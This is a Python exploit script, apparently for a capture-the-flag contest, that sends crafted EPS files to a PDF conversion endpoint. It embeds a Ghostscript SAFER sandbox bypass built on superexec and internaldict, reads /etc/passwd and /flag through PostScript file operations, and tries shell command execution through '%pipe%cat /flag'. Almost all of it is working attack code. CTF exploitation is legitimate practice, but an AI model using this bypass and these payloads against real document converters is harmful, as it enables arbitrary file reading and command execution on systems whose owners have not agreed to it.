#!/usr/bin/env python3
"""Temporary CTF EPS/Ghostscript probe with rendering control."""
import io
import urllib.error
import urllib.request
import uuid
from pypdf import PdfReader

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"

STATIC = r'''%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 36 36 576 756
%%Pages: 1
%%EndComments
/Courier 20 selectfont
72 500 moveto
(ARENA_STATIC_MARKER) show
showpage
%%EOF
'''

READER = r'''%!PS-Adobe-3.0 EPSF-3.0
%%Document-Fonts: Times-Roman
%%Title: circle.eps
%%Pages: 1
%%BoundingBox: 36 36 576 756
%%LanguageLevel: 1
%%EndComments
/Courier 20 selectfont
72 500 moveto
BYPASS
/infile (TARGET) (r) file def
/buff 1024 string def
/Courier 8 selectfont
/LM 40 def
/ypos 400 def
/lineheight 10 def
/newline { ypos lineheight sub /ypos exch def LM ypos moveto } def
LM ypos moveto
{
  infile buff readline
  { buff cvs show newline }
  { buff cvs show infile closefile exit }
  ifelse
} bind loop
showpage
%%Trailer
'''

BYPASS = "{ systemdict /SAFER false put systemdict /userparams get /PermitFileControl [(*)] put systemdict /userparams get /PermitFileWriting [(*)] put systemdict /userparams get /PermitFileReading [(*)] put } 1183615869 internaldict /superexec get exec"


def convert(data, label):
    boundary = "----Arena" + uuid.uuid4().hex
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"probe.eps\"\r\nContent-Type: application/postscript\r\n\r\n".encode() + data.encode() + f"\r\n--{boundary}--\r\n".encode())
    req = urllib.request.Request(BASE + "/cool/convert-to/pdf", data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(3000000)
            print("STATUS", r.status, "BYTES", len(raw), flush=True)
            if raw.startswith(b"%PDF"):
                try:
                    reader = PdfReader(io.BytesIO(raw))
                    print("PDF_TEXT", "\n".join((p.extract_text() or "") for p in reader.pages), flush=True)
                except Exception as e:
                    print("PDF_PARSE_ERROR", repr(e), flush=True)
            else:
                print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


convert(STATIC, "STATIC_CONTROL")
for target, bypass, label in (
    ("/etc/passwd", "", "DIRECT_PASSWD"),
    ("/etc/passwd", BYPASS, "SUPEREXEC_PASSWD"),
    ("/flag", BYPASS, "SUPEREXEC_FLAG"),
    ("%pipe%cat /flag", "", "PIPE_FLAG"),
    ("%pipe%cat /flag", BYPASS, "SUPEREXEC_PIPE_FLAG"),
):
    convert(READER.replace("TARGET", target).replace("BYPASS", bypass), label)
